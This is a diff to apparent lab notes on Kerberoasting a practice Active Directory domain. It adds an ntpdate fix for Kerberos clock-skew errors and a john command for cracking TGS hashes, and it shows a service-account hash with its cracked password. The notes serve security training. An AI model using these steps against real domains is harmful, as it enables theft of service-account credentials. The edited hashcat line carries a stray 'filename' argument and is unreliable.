@@ -15,6 +15,14 @@
 
   $krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$eb60bb[STRIPPED]7e35f1a787901409e16bc
   ```
+  - If we get this error `[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` we need to coordinate our time with the server time using ntpdate 
+     - `sudo apt install ntpdate`
+     - `sudo ntpdate 10.10.10.100`
+        ```
+        5 Mar 19:42:53 ntpdate[19369]: step time server 10.10.10.100 offset +426.954203 sec
+        ```
+  - And then you should be able to rerun and actually get the hash
+
 - Finding the proper module in hashcat `hashcat --help | grep Kerberos`
   ```
   ┌──(root💀kali)-[~/active-directory]
@@ -31,8 +39,14 @@
 - Crack the hash with hachcat
   ```
   ┌──(root💀kali)-[~/active-directory]
-  └─# hashcat -m 13100 hashkerb.txt /usr/share/wordlists/rockyou.txt -O 
+  └─# hashcat -m 13100 hashkerb.txt /usr/share/wordlists/rockyou.txt -O filename
   ```
+- Crack the hash with john
+  - Alternatively we can use john
+  ```
+  john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerbhash.txt
+  ```
+
 - We get the password
   ```
   $krb5tgs$23$*SQLService$MARVEL.LOCAL$HYDRA-DC/SQLService.MARVEL.local~60111*$eb6[STRIPPED]6bc:MYpassword123#
